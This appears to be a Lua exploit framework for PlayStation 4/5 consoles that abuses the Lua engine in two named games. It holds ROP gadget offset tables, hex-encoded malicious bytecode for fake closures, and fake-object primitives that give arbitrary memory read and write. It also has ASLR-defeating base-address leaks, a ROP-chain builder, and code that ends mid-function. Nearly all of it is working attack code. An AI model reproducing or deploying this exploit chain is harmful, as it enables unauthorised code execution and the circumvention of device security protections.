
PLATFORM = "ps4"  -- ps4 or ps5
FW_VERSION = nil

WRITABLE_PATH = "/av_contents/content_tmp/"
LOG_FILE = WRITABLE_PATH .. "log.txt"
log_fd = io.open(LOG_FILE, "w")

eboot_base = nil
libc_base = nil
libkernel_base = nil

games_identification = {
    ["bb0"] = "RaspberryCube",
    ["b90"] = "Aibeya",
}

gadget_table = {
    raspberry_cube = {
        gadgets = {
            ["ret"] = 0xd2811,
            ["jmp $"] = 0x4a5c8,

            ["pop rsp; ret"] = 0xa12,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0xa02,
            ["pop rbx; ret"] = 0x5dce6,
            ["pop rcx; ret"] = 0x0147cf,
            ["pop rdx; ret"] = 0x53762,
            ["pop rdi; ret"] = 0x467c69,
            ["pop rsi; ret"] = 0xd2810,
            ["pop r8; ret"] = 0xa01,
            ["mov r9, rbx; call [rax + 8]"] = 0x14a9a0,

            ["mov [rdi], rsi; ret"] = 0xd0d7f,
            ["mov [rdi], rax; ret"] = 0x9522b,
            ["mov [rdi], eax; ret"] = 0x9522c,
            ["add [rbx], eax; ret"] = 0x4091a3,
            ["add [rbx], ecx; ret"] = nil,
            ["mov rax, [rax]; ret"] = 0x1fd5b,
            ["inc dword [rax]; ret"] = 0x1a12eb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x2dcc59,
            ["sete al; ret"] = 0x538c7,
            ["setne al; ret"] = 0x556,
            ["seta al; ret"] = 0x166fce,
            ["setb al; ret"] = 0x5dd64,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xcb0da,
            ["shl rax, cl; ret"] = 0xd5611,
            ["add rax, rcx; ret"] = 0x354be,
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x1a7bb0, -- to resolve eboot base
            longjmp_import = 0x619388, -- to resolve libc base
        },
        libc_addrofs = {
            memcpy = 0x4e9d0,
            longjmp = 0xb68b0,
            strerror = 0x42e40,
            error = 0x178,
            sceKernelGetModuleInfoFromAddr = 0x1a8,
            gettimeofday_import = 0x11c010, -- syscall wrapper
        }
    },
    aibeya = {
        gadgets = {    
            ["ret"] = 0x4c,
            ["jmp $"] = nil,

            ["pop rsp; ret"] = 0xa02,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0x9f2,
            ["pop rbx; ret"] = 0x60876,
            ["pop rcx; ret"] = 0x14a7f,
            ["pop rdx; ret"] = 0x3f3647,
            ["pop rdi; ret"] = 0x1081c0,
            ["pop rsi; ret"] = 0x10ef32,
            ["pop r8; ret"] = 0x9f1,
            ["mov r9, rbx; call [rax + 8]"] = 0x1511ff,

            ["mov [rdi], rsi; ret"] = 0xd76ff,
            ["mov [rdi], rax; ret"] = 0x994cb,
            ["mov [rdi], eax; ret"] = 0x994cc,
            ["add [rbx], eax; ret"] = nil,
            ["add [rbx], ecx; ret"] = 0x44093b,
            ["mov rax, [rax]; ret"] = 0x2008b,
            ["inc dword [rax]; ret"] = 0x1a82cb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x44ef72,
            ["sete al; ret"] = 0x55747,
            ["setne al; ret"] = 0x50f,
            ["seta al; ret"] = 0x16dbce,
            ["setb al; ret"] = 0x608f4,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xd1a6a,
            ["shl rax, cl; ret"] = 0xdbf31,
            ["add rax, rcx; ret"] = 0x35afe,
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x1aeb90, -- to resolve eboot base
            longjmp_import = 0x6193e8, -- to resolve libc base
        },
        libc_addrofs = {
            memcpy = 0x4df50,
            longjmp = 0xb5680,
            strerror = 0x42540,
            error = 0x168,
            sceKernelGetModuleInfoFromAddr = 0x198,
            gettimeofday_import = 0x204060, -- syscall wrapper
        }
    },
}


--
-- misc functions
--

function notify(s)
    e:tag{"dialog", title="", message=s}
end

function error(s)
    assert(false, s)
end

function errorf(fmt, ...)
    error(string.format(fmt, ...))
end

function prepare_arguments(...)
    local s = ""
    for i,v in ipairs(arg) do
        s = s .. tostring(v)
        if i < #arg then
            s = s .. "\t"
        end
    end
    return s
end

function print(...)
    log_fd:write(prepare_arguments(...) .. "\n")
    log_fd:flush()
end

function printf(fmt, ...)
    log_fd:write(string.format(fmt, ...) .. "\n")
    log_fd:flush()
end

function file_write(filename, data, mode)
    local fd = io.open(filename, mode or "wb")
    fd:write(data)
    fd:close()
end

function file_read(filename, mode)
    return io.open(filename, mode):read("*all")
end

function hex_dump(buf, addr)
    addr = addr or 0
    local result = {}
    for i = 1, #buf, 16 do
        local chunk = buf:sub(i, i+15)
        local hexstr = chunk:gsub('.', function(c) 
            return string.format('%02X ', string.byte(c)) 
        end)
        local ascii = chunk:gsub('%c', '.') -- replace non-printable characters
        table.insert(result, string.format('%s  %-48s %s', hex(addr+i-1), hexstr, ascii))
    end
    return table.concat(result, '\n')
end

function hex_to_binary(hex)
    return (hex:gsub('..', function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

function bin_to_hex(str)
    return (str:gsub('.', function(c)
        return string.format('%02x', string.byte(c))
    end))
end

function load_bytecode(data)
    local bc, err = loadstring(hex_to_binary(data:gsub("%s+", "")))
    assert(bc, "error while loading bytecode: " .. tostring(err))
    return bc
end

function run_with_coroutine(f)
    local co = coroutine.create(f)
    local ok, result = coroutine.resume(co)
    if not ok then
        local traceback = debug.traceback(co) .. debug.traceback():sub(17)
        return result .. "\n" .. traceback
    end
end

function run_nogc(f)
    collectgarbage("stop")
    f()
    collectgarbage("restart")
end

function sleep(a) 
    local sec = tonumber(os.clock() + a); 
    while (os.clock() < sec) do 
    end 
end

function dump_table(o, depth, indent)
    depth = depth or 2
    indent = indent or 0
    if depth < 1 then return tostring(o) end
    local function get_indent(level)
        return string.rep("  ", level)
    end
    if type(o) == 'table' then
        local s = '{\n'
        local inner_indent = indent + 1
        for k, v in pairs(o) do
            s = s .. get_indent(inner_indent)
            if type(k) ~= 'number' then
                k = '"' .. k .. '"'
            end
            s = s .. '[' .. k .. '] = ' .. dump_table(v, depth - 1, inner_indent)
            s = s .. ',\n'
        end
        s = s .. get_indent(indent) .. '}'
        return s
    else
        return tostring(o)
    end
end

-- credit: https://github.com/iryont/lua-struct/blob/master/src/struct.lua#L149-L174
function string_to_double(x)
    assert(#x == 8)
    -- x = string.reverse(x)  -- if big endian
    local sign = 1
    local mantissa = string.byte(x, 7) % 16
    for i = 6, 1, -1 do
        mantissa = mantissa * (2 ^ 8) + string.byte(x, i)
    end
    if string.byte(x, 8) > 127 then
        sign = -1
    end
    local exponent = (string.byte(x, 8) % 128) * 16 + math.floor(string.byte(x, 7) / 16)
    if exponent == 0 then
        return 0.0
    else
        mantissa = (math.ldexp(mantissa, -52) + 1) * sign
        return math.ldexp(mantissa, exponent - 1023)
    end
end

function align_to(v,n) return v + (n - v % n) % n end
function align_16(v) return align_to(v, 16) end

function find_pattern(buffer, pattern)
    local pat = pattern:gsub("%S+", function(b)
        return b == "?" and "." or string.char(tonumber(b, 16))
    end):gsub("%s+", "")
    local matches, start = {}, 1
    while true do
        local s = buffer:find(pat, start)
        if not s then break end
        matches[#matches+1], start = s, s+1
    end
    return matches
end





--
-- bit32 class
--
-- credit: https://github.com/minetest-mods/turtle/blob/master/bit32.lua
--

bit32 = {}

bit32.N = 32
bit32.P = 2 ^ bit32.N

function bit32.bnot(x)
    x = x % bit32.P
    return bit32.P - 1 - x
end

function bit32.band(...)
    local args = {...}
    local result = args[1] or 0
    for i = 2, #args do
        local x, y = result, args[i]
        -- Common usecases, they deserve to be optimized
        if y == 0xff then
            result = x % 0x100
        elseif y == 0xffff then
            result = x % 0x10000
        elseif y == 0xffffffff then
            result = x % 0x100000000
        else
            x, y = x % bit32.P, y % bit32.P
            result = 0
            local p = 1
            for j = 1, bit32.N do
                local a, b = x % 2, y % 2
                x, y = math.floor(x / 2), math.floor(y / 2)
                if a + b == 2 then
                    result = result + p
                end
                p = 2 * p
            end
        end
    end
    return result
end

function bit32.bor(...)
    local args = {...}
    local result = args[1] or 0
    for i = 2, #args do
        local x, y = result, args[i]
        -- Common usecases, they deserve to be optimized
        if y == 0xff then
            result = x - (x%0x100) + 0xff
        elseif y == 0xffff then
            result = x - (x%0x10000) + 0xffff
        elseif y == 0xffffffff then
            result = 0xffffffff
        else
            x, y = x % bit32.P, y % bit32.P
            result = 0
            local p = 1
            for j = 1, bit32.N do
                local a, b = x % 2, y % 2
                x, y = math.floor(x / 2), math.floor(y / 2)
                if a + b >= 1 then
                    result = result + p
                end
                p = 2 * p
            end
        end
    end
    return result
end

function bit32.bxor(...)
    local args = {...}
    local result = args[1] or 0
    for i = 2, #args do
        local x, y = result, args[i]
        x, y = x % bit32.P, y % bit32.P
        result = 0
        local p = 1
        for j = 1, bit32.N do
            local a, b = x%2, y%2
            x, y = math.floor(x/2), math.floor(y/2)
            if a + b == 1 then
                result = result + p
            end
            p = 2 * p
        end
    end
    return result
end

function bit32.lshift(x, s_amount)
    if math.abs(s_amount) >= bit32.N then return 0 end
    x = x % bit32.P
    if s_amount < 0 then
        return math.floor(x * (2 ^ s_amount))
    else
        return (x * (2 ^ s_amount)) % bit32.P
    end
end

function bit32.rshift(x, s_amount)
    if math.abs(s_amount) >= bit32.N then return 0 end
    x = x % bit32.P
    if s_amount > 0 then
        return math.floor(x * (2 ^ - s_amount))
    else
        return (x * (2 ^ -s_amount)) % bit32.P
    end
end

function bit32.arshift(x, s_amount)
    if math.abs(s_amount) >= bit32.N then return 0 end
    x = x % bit32.P
    if s_amount > 0 then
        local add = 0
        if x >= bit32.P/2 then
            add = bit32.P - 2 ^ (bit32.N - s_amount)
        end
        return math.floor(x * (2 ^ -s_amount)) + add
    else
        return (x * (2 ^ -s_amount)) % bit32.P
    end
end






--
-- uint64 class
--
-- constructor accepts:
-- 1) uint64 instance
-- 2) hex value in string ("0xaabb")
-- 3) lua number
--
-- note: from llm and refined over time. might have some bugs
--

uint64 = {}
uint64.__index = uint64

setmetatable(uint64, {
    __call = function(_, v) -- make class callable
        return uint64:new(v)
    end
})

function is_uint64(v) 
    return type(v) == "table" and v.h and v.l and true or false 
end

function ub8(n) 
    return uint64(n):pack() 
end

function hex(v)
    if is_uint64(v) then
        return tostring(v)
    elseif type(v) == "number" then
        return string.format("0x%x", v)
    else
        errorf("hex: unknown type (%s)", type(v))
    end
end

function uint64:new(v)

    local self = setmetatable({}, uint64)

    if is_uint64(v) then
        self.h, self.l = v.h, v.l
    elseif type(v) == "number" then
        self.h, self.l = math.floor(v / 2^32), v % 2^32
    elseif type(v) == "string" then
        if v:sub(1, 2):lower() == "0x" then  -- init from hexstring
            v = v:sub(3):gsub("^0+", ""):upper()
            assert(#v <= 16, string.format("uint64:new: hex string too long for uint64 (%s)", v))
            v = string.rep("0", 16 - #v) .. v  -- pad with leading zeros
            self.h = tonumber(v:sub(1, 8), 16) or 0
            self.l = tonumber(v:sub(9, 16), 16) or 0
        else
            local num = tonumber(v)  -- assume its normal number
            assert(num, string.format("uint64:new: invalid decimal string for uint64 (%s)", v))
            self.h, self.l = math.floor(num / 2^32), num % 2^32
        end
    else
        errorf("uint64:new: invalid type passed to constructor (%s)", type(v))
    end

    return self
end

function uint64:__tostring()
    local hex = string.format("%x%08x", self.h, self.l):gsub("^0+", "")
    return "0x" .. (hex == "" and "0" or hex)
end

function uint64:tonumber()
    if self.h >= 0x80000000 then -- for negative number
        return -(bit32.bnot(self.h) * 2^32 + bit32.bnot(self.l) + 1)
    else
        return self.h * 2^32 + self.l
    end
end

function uint64:pack()
    return string.char(
        self.l % 256,
        bit32.rshift(self.l, 8) % 256,
        bit32.rshift(self.l, 16) % 256,
        bit32.rshift(self.l, 24) % 256,
        self.h % 256,
        bit32.rshift(self.h, 8) % 256,
        bit32.rshift(self.h, 16) % 256,
        bit32.rshift(self.h, 24) % 256
    )
end

function uint64.unpack(str)
    if not (type(str) == "string" and #str == 8 or #str == 4) then
        error("uint64.unpack: input string must be 8 or 4 length size")
    end
    local l = str:byte(1) + bit32.lshift(str:byte(2), 8) 
        + bit32.lshift(str:byte(3), 16) + bit32.lshift(str:byte(4), 24)
    local h = #str == 8 and (str:byte(5) + bit32.lshift(str:byte(6), 8) 
        + bit32.lshift(str:byte(7), 16) + bit32.lshift(str:byte(8), 24)) or 0
    return uint64({h = h, l = l})
end

-- note: comparison ops only work if both are same type

function uint64:__eq(v)
    v = uint64(v)
    return self.h == v.h and self.l == v.l
end

function uint64:__lt(v)
    v = uint64(v)
    return self.h < v.h or (self.h == v.h and self.l < v.l)
end

function uint64:__le(v)
    v = uint64(v)
    return self.h < v.h or (self.h == v.h and self.l <= v.l)
end

function uint64:__add(v)
    v = uint64(v)
    local l = self.l + v.l
    local h = self.h + v.h + (l >= 2^32 and 1 or 0)
    return uint64({h = h % 2^32, l = l % 2^32})
end

function uint64:__sub(v)
    v = uint64(v)
    local l = self.l - v.l
    local h = self.h - v.h - (l < 0 and 1 or 0)
    return uint64({h = (h + 2^32) % 2^32, l = (l + 2^32) % 2^32})
end

function uint64:__mul(v)
    v = uint64(v)
    local ah, al, bh, bl = self.h, self.l, v.h, v.l
    local h = ah * bl + al * bh
    local l = al * bl
    return uint64({h = (h + bit32.rshift(l, 32)) % 2^32, l = l % 2^32})
end

function uint64:divmod(v)
    v = uint64(v)
    if v.h == 0 and v.l == 0 then error("division by zero") end
    local q, r = uint64(0), uint64(0)
    for i = 63, 0, -1 do
        r = r:lshift(1)
        if bit32.rshift(self.h, i % 32) % 2 == 1 or (i < 32 and bit32.rshift(self.l, i) % 2 == 1) then
            r = r:add(1)
        end
        if not r:__lt(v) then
            r = r:sub(v)
            q = q:add(uint64(1):lshift(i))
        end
    end
    return q, r
end

function uint64:__div(v) return select(1, self:divmod(v)) end
function uint64:__mod(v) return select(2, self:divmod(v)) end

function uint64:lshift(n)
    if n >= 64 then return uint64(0) end
    if n >= 32 then
        return uint64({h = bit32.lshift(self.l, n - 32), l = 0})
    else
        local h = bit32.bor(bit32.lshift(self.h, n), bit32.rshift(self.l, 32 - n))
        local l = bit32.lshift(self.l, n)
        return uint64({h = h, l = l})
    end
end

function uint64:rshift(n)
    if n >= 64 then return uint64(0) end
    if n >= 32 then
        return uint64({h = 0, l = bit32.rshift(self.h, n - 32)})
    else
        local h = bit32.rshift(self.h, n)
        local l = bit32.bor(bit32.rshift(self.l, n), bit32.lshift(self.h % (2^n), 32 - n))
        return uint64({h = h, l = l})
    end
end

function uint64:bxor(v)
    v = uint64(v)
    local h = bit32.bxor(self.h, v.h)
    local l = bit32.bxor(self.l, v.l)
    return uint64({h = h, l = l})
end

function uint64:band(v)
    v = uint64(v)
    local h = bit32.band(self.h, v.h)
    local l = bit32.band(self.l, v.l)
    return uint64({h = h, l = l})
end

function uint64:bor(v)
    v = uint64(v)
    local h = bit32.bor(self.h, v.h)
    local l = bit32.bor(self.l, v.l)
    return uint64({h = h, l = l})
end

function uint64:bnot()
    local h = bit32.bnot(self.h)
    local l = bit32.bnot(self.l)
    return uint64({h = h, l = l})
end





--
-- lua class
--
-- provide read and limited write primitives
--

lua_types = {
    LUA_TNIL = 0,
    LUA_TBOOLEAN = 1,
    LUA_TLIGHTUSERDATA = 2,
    LUA_TNUMBER = 3,
    LUA_TSTRING = 4,
    LUA_TTABLE = 5,
    LUA_TFUNCTION = 6,
    LUA_TUSERDATA = 7,
    LUA_TTHREAD = 8
}

fakeobj_lclosure_bc = [[
    1b4c756151000104080408000b0000000000000040626367656e2e6c756100430000005100000000
    01000407000000a400000000000001000000009c808000c10000009e0080011e0080000100000003
    0000000000e494400100000000000000000000004500000050000000020000020700000024000000
    04000000040080001c408000010000001e0000011e00800001000000030000000000004540010000
    0000000000000000004600000049000000020000020300000004008000080000001e008000000000
    00000000000300000048000000480000004900000000000000020000000700000000000000746172
    676574000800000000000000636c6f73757265000700000049000000490000004900000049000000
    4d0000004d0000005000000000000000020000000700000000000000746172676574000800000000
    000000636c6f73757265000700000050000000500000005000000050000000500000005000000051
    000000020000000800000000000000636c6f73757265000000000006000000070000000000000074
    617267657400000000000600000000000000
]]

write_upval_bc = [[
    1b4c756151000104080408000b0000000000000040626367656e2e6c756100550000006000000000
    02000606000000e4000000000080010001000040018000dc4080011e008000000000000100000000
    00000000000000570000005f0000000102000406000000a400000004000000c00000009c40000148
    0000001e00800000000000010000000000000000000000580000005b000000010100020200000008
    0000001e0080000000000000000000020000005a0000005b00000001000000080000000000000063
    6c6f7375726500000000000100000001000000070000000000000074617267657400060000005b00
    00005b0000005b0000005b0000005e0000005f000000020000000800000000000000636c6f737572
    65000000000005000000060000000000000076616c75650000000000050000000100000007000000
    0000000074617267657400060000005f0000005f0000005f0000005f0000005f0000006000000003
    0000000800000000000000636c6f73757265000000000005000000060000000000000076616c7565
    000000000005000000070000000000000074617267657400000000000500000000000000
]]



lua = {}

function lua.setup_primitives()
    
    -- evil bytecodes
    lua.fakeobj_closure = load_bytecode(fakeobj_lclosure_bc)
    lua.write_upval = load_bytecode(write_upval_bc)

    lua.setup_initial_read_primitive()  -- one small step
    lua.resolve_address()  -- break aslr and resolve offsets
    lua.setup_victim_table()  -- setup better addrof primitive  
end

-- allocate a limited length string with a known address
function lua.create_str_hacky(data)

    assert(#data <= 39)
    
    local prev_t1, prev_t2 = {}, {}
    local str, addr

    for i=1,16 do
        collectgarbage()
        local t = {}
        local l,s

        if i % 2 == 0 then
            for j=1,5 do t[j] = {} end
            s = data .. string.rep("\0", (39 - #data))
        else
            s = data .. string.rep("\0", (39 - #data))
            for j=1,5 do t[j] = {} end
        end

        prev_t1[i] = lua.addrof_trivial(t[1])
        prev_t2[i] = lua.addrof_trivial(t[2])
        
        if i >= 3 then
            if prev_t1[i-1] == prev_t1[i-2] then
                str, addr = s, prev_t1[i-1]
                break
            elseif prev_t2[i-1] == prev_t2[i-2] then
                str, addr = s, prev_t2[i-1]
                break
            end
        end
    end

    assert(str ~= nil and addr ~= nil, "failed to leak string addr")
    return str, addr
end

function lua.create_str(str)
    local addr = lua.addrof(str)
    if not addr then
        str, addr = lua.create_str_hacky(str)
    end
    return str, addr+24
end

function lua.fakeobj(fake_obj_addr, ttype)
    local addr, fake_tvalues, fake_proto, fake_closure
    fake_tvalues, addr = lua.create_str(ub8(fake_obj_addr) .. ub8(ttype))  -- value + ttype
    fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))  -- env + proto
    return lua.fakeobj_closure(fake_closure)
end

function lua.setup_initial_read_primitive()
    
    local fake_str_size = 0x100000001337

    -- next + tt/marked/extra/padding/hash + len
    lua.fake_str, lua.fake_str_addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(fake_str_size))
    lua.fake_str = lua.fakeobj(lua.fake_str_addr, lua_types.LUA_TSTRING)

    assert(bit32.band(#lua.fake_str, 0xffff) == 0x1337, "failed to create fake string obj")
end

function lua.setup_better_read_primitive()

    -- setup fake string at first eboot segment we can read
    local new_fake_str_addr = eboot_addrofs.fake_string

    -- if current fake str is already behind eboot segment, then do nothing
    if new_fake_str_addr > lua.fake_str_addr then return end

    lua.fake_str = lua.fakeobj(new_fake_str_addr, lua_types.LUA_TSTRING)
    lua.fake_str_addr = new_fake_str_addr
end

function lua.resolve_game(luaB_auxwrap)
    print("[+] luaB_auxwrap @ " .. hex(luaB_auxwrap))
    local hex_nibbles = hex(luaB_auxwrap):sub(-3)
    print("[+] luaB_auxwrap nibbles: " .. hex_nibbles)
    
    if not games_identification[hex_nibbles] then
        print("[-] Game not identified. Falling back to Raspberry Cube")
        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
        gadgets = gadget_table.raspberry_cube.gadgets
        return
    end
    
    if games_identification[hex_nibbles] == "RaspberryCube" then
        print("[+] Game identified as Raspberry Cube")
        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
        gadgets = gadget_table.raspberry_cube.gadgets
    elseif games_identification[hex_nibbles] == "Aibeya" then
        print("[+] Game identified as Aibeya")
        eboot_addrofs = gadget_table.aibeya.eboot_addrofs
        libc_addrofs = gadget_table.aibeya.libc_addrofs
        gadgets = gadget_table.aibeya.gadgets
    end
end

function lua.resolve_address()
    luaB_auxwrap = nil
    local consume = {}
    for i=1,64 do

        local co = coroutine.wrap(function() end)
        consume[i] = co

        -- read f field of CClosure (luaB_auxwrap)
        local addr = lua.read_qword(lua.addrof(co)+0x20)
        if addr then
            -- calculate eboot base from luaB_auxwrap offset
            luaB_auxwrap = addr
            break
        end
    end
    
    lua.resolve_game(luaB_auxwrap)
    
    eboot_base = luaB_auxwrap - eboot_addrofs.luaB_auxwrap
    print("[+] eboot base @ " .. hex(eboot_base))

    assert(eboot_base ~= nil, "failed to find eboot base")

    -- resolve offsets to their address
    for k,offset in pairs(gadgets) do 
        gadgets[k] = eboot_base + offset 
    end
    for k,offset in pairs(eboot_addrofs) do 
        eboot_addrofs[k] = eboot_base + offset 
    end

    -- setup fake string that can read more memory space
    lua.setup_better_read_primitive()

    -- resolve libc
    libc_base = lua.read_qword(eboot_addrofs.longjmp_import) - libc_addrofs.longjmp
    print("[+] libc base @ " .. hex(libc_base))
    
    for k,offset in pairs(libc_addrofs) do 
        libc_addrofs[k] = libc_base + offset 
    end
end

-- setup a table where we can read its array buffer
function lua.setup_victim_table()
    assert(lua.fake_str ~= nil)
    local t = { 1, 2 }
    local array_addr = lua.read_qword(lua.addrof(t)+24)
    if array_addr then
        if lua.read_buffer(array_addr, 1) then  -- test if we can read the buffer
            lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
        end
    end
    assert(lua.tbl_victim ~= nil and lua.tbl_victim_array_addr ~= nil, "failed to find victim table")
end

function lua.get_obj_value(obj)
    if not lua.tbl_victim then return nil end
    lua.tbl_victim[1] = obj
    return lua.read_qword(lua.tbl_victim_array_addr)
end

function lua.addrof_trivial(x)
    local addr = tostring(x):match("^%a+:? 0?x?%(?(%x+)%)?$")
    return addr and uint64("0x" .. addr) or nil
end

function lua.addrof(obj)
    return lua.get_obj_value(obj) or lua.addrof_trivial(obj)
end

function lua.read_buffer(addr, size)
    if not lua.fake_str then return nil end
    size = uint64(size):tonumber()
    -- check if addr to read is after fake string addr
    local rel_addr = uint64(addr - (lua.fake_str_addr + 23)):tonumber()
    return rel_addr >= 0 and lua.fake_str:sub(rel_addr, rel_addr + size - 1) or nil 
end

function lua.read_qword(addr)
    local value = lua.read_buffer(addr, 8)
    return value and #value == 8 and uint64.unpack(value) or nil 
end

function lua.read_multiple_qwords(addr, count)
    local qwords = {}
    local buffer = lua.read_buffer(addr, count*8)
    for i=0,(#buffer/8)-1 do
        qwords[i+1] = uint64.unpack(buffer:sub(i*8+1, i*8+8))
    end
    return qwords
end

-- write 8 bytes (double) at target address with 4 bytes corruption
function lua.write_double(addr, value)
    local fake_upval = ub8(0x0) .. ub8(0x0) .. ub8(addr)  -- next + tt/marked + addr to tvalue
    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.addrof(fake_upval)+24)  -- env + proto + upvals
    lua.write_upval(fake_closure, value)
end

-- write 8 bytes (qword) at target address with 5 bytes corruption
function lua.write_qword(addr, value)
    local setbit = uint64(1):lshift(56)
    value = uint64(value)
    lua.write_double(addr, string_to_double(ub8(value + setbit)))
    lua.write_double(addr+1, string_to_double(ub8(value:rshift(8) + setbit)))
end

function lua.write_multiple_qwords(addr, list)
    for i,v in ipairs(list) do
        lua.write_qword(addr+8*(i-1), list[i])
    end
end

-- copy memory from src to dest with 5 bytes corruption after dest+size
function lua.memcpy(dest, src, size)
    size = uint64(size):tonumber()
    assert(size % 8 == 0, string.format("lua.memcpy: size should be aligned by 8 bytes (given %s)", hex(size)))
    lua.write_multiple_qwords(dest, lua.read_multiple_qwords(src, size / 8))
end





--
-- memory class
--
-- provide arbitrary r/w primitives
--

memory = {}

function memory.read_buffer(addr, size)
    assert(addr and size)
    return lua.read_buffer(addr, size)
end

function memory.read_dword(addr)
    local value = memory.read_buffer(addr, 4)
    return value and uint64.unpack(value) or nil 
end

function memory.read_qword(addr)
    local value = memory.read_buffer(addr, 8)
    return value and uint64.unpack(value) or nil 
end

function memory.write_buffer(dest, buffer)
    assert(memory.memcpy and dest and buffer)
    memory.memcpy(dest, lua.addrof(buffer)+24, #buffer)
end

function memory.write_byte(dest, value)
    memory.write_buffer(dest, ub8(value):sub(1,1))
end

function memory.write_word(dest, value)
    memory.write_buffer(dest, ub8(value):sub(1,2))
end

function memory.write_dword(dest, value)
    memory.write_buffer(dest, ub8(value):sub(1,4))
end

function memory.write_qword(dest, value)
    memory.write_buffer(dest, ub8(value))
end

function memory.memset(addr, val, size)
    assert(type(val) == "number")
    memory.write_buffer(addr, string.rep(string.char(val), size))
end

function memory.hex_dump(addr, size)
    return hex_dump(memory.read_buffer(addr, size), addr)
end

function memory.read_null_terminated_string(addr)
    local result = ""
    while true do
        local chunk = memory.read_buffer(addr, 0x50)
        local null_pos = chunk:find("\0")
        if null_pos then 
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        addr = addr + #chunk
    end
    return result
end





--
-- bump allocator class
--
-- provide memory allocation which is backed by lua string
--

bump = {}

bump.pool_size = 5 * 1024 * 1024  -- 5mb

function bump.init()
    local padding = align_16(24) -- offset to data
    bump.lua_backing = string.rep("\0", bump.pool_size + padding)
    bump.pool_base = lua.addrof(bump.lua_backing) + padding
    bump.pool_current = bump.pool_base
end

function bump.alloc(size)

    assert(type(size) == "number")

    -- init for first time
    if not bump.pool_base then
        bump.init()
    end

    -- compensate for write corruption by lua primitive
    size = align_16(size + 8)

    if bump.pool_current + size >= bump.pool_base + bump.pool_size then
        error("bump allocator exhausted")
    end

    local addr = bump.pool_current
    bump.pool_current = bump.pool_current + size
    return addr
end

function bump.free_after_finish(f)
    local prev_cur = bump.pool_current
    f()
    local allocated_size = (bump.pool_current - prev_cur):tonumber()
    memory.memset(prev_cur, 0, allocated_size)
    bump.pool_current = prev_cur
end





--
-- ropchain class
--
-- helper for creating rop chains
--

ropchain = {}
ropchain.__index = ropchain

setmetatable(ropchain, {
    __call = function(_, stack_size, padding)  -- make class callable as constructor
        return ropchain:new(stack_size, padding)
    end
})

function ropchain:new(stack_size, padding)

    stack_size = stack_size or 0x500

    -- our rop might call a fn with huge stack frame, which side effect of
    -- trashing data past our stack boundary
    padding = padding or 0x100

    local self = setmetatable({}, ropchain)

    self.stack_offset = 0
    self.stack_size = stack_size + padding
    self.stack_base = bump.alloc(self.stack_size) + padding
    self.stack_backup = bump.alloc(self.stack_size) + padding
    
    self.jmpbuf_size = 0x50
    self.jmpbuf_backup = bump.alloc(self.jmpbuf_size)
    
    self.recover_from_call = bump.alloc(0x20)
    
    self.retval_addr = {}
    self.placeholder = {}
    self.placeholder_value = {}

    -- compensate for stack slot that is used by longjmp
    self.increment_stack(self)

    -- recover from call [rax+8] instruction
    lua.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])

    return self
end

function ropchain:get_symbols()
    local value_symbol = {}
    local offset_symbol = {}
    for i,t in ipairs({gadgets, eboot_addrofs, libc_addrofs}) do
        for k,v in pairs(t) do
            value_symbol[hex(v)] = k
        end
    end
    -- for k,v in pairs(syscall_wrapper) do 
    --     value_symbol[hex(v)] = "syscall " .. tostring(k)
    -- end
    for name,t in pairs(self.placeholder) do
        for i,offset in ipairs(t) do
            offset_symbol[offset] = string.format("placeholder %s [%d]", name, i)
        end
    end
    return value_symbol, offset_symbol
end

function ropchain:__tostring()

    local result = {}

    table.insert(result, string.format("ropchain @ %s (size: %s)\n", 
        hex(self.stack_base), hex(self:chain_size())))
    
    -- stack base will be corrupted after execution so use backup as source for printing
    local source = self.finalized and self.stack_backup or self.stack_base
    local qwords = lua.read_multiple_qwords(source, self:chain_size() / 8)
    local value_symbol, offset_symbol = self:get_symbols()

    for i,val in pairs(qwords) do
        local offset = 8*(i-1)
        val = hex(val)
        if offset_symbol[offset] then
            val = val .. string.format("\t; %s", offset_symbol[offset])
        elseif value_symbol[val] then
            val = val .. string.format("\t; %s", value_symbol[val])
        end
        table.insert(result, string.format("%s: %s", hex(self.stack_base + offset), val))
    end

    return "\n" .. table.concat(result, "\n")
end


function ropchain:chain_size() return self.stack_offset end
function ropchain:get_rsp() return self.stack_base + self:chain_size() end

-- align stack to 16 bytes
function ropchain:align_stack()
    if self:chain_size() % 16 == 8 then
        self:push_ret()
    end
end

function ropchain:increment_stack()
    assert(self:chain_size() < self.stack_size, "ropchain storage exhausted")
    local rsp = self:get_rsp()
    self.stack_offset = self.stack_offset + 8
    return rsp
end

function ropchain.resolve_value(v)
    if type(v) == "string" then
        v = lua.addrof(v.."\0")+24  -- with null terminator
    elseif not (is_uint64(v) or type(v) == "number") then
        errorf("ropchain.resolve_value: invalid type (%s)", type(v))
    end
    return v
end

function ropchain:push(v)
    assert(not self.finalized, "ropchain has been finalized and cant be modified")
    lua.write_qword(self:increment_stack(), ropchain.resolve_value(v))
end

function ropchain:push_ret()
    self:push(gadgets["ret"])
end

function ropchain:push_set_rsp(v) 
    self:push(gadgets["pop rsp; ret"])
    self:push(v)
end

function ropchain:push_set_rbp(v) 
    self:push(gadgets["pop rbp; ret"])
    self:push(v)
end

function ropchain:push_set_rax(v)
    self:push(gadgets["pop rax; ret"])
    self:push(v)
end

function ropchain:push_set_rbx(v)
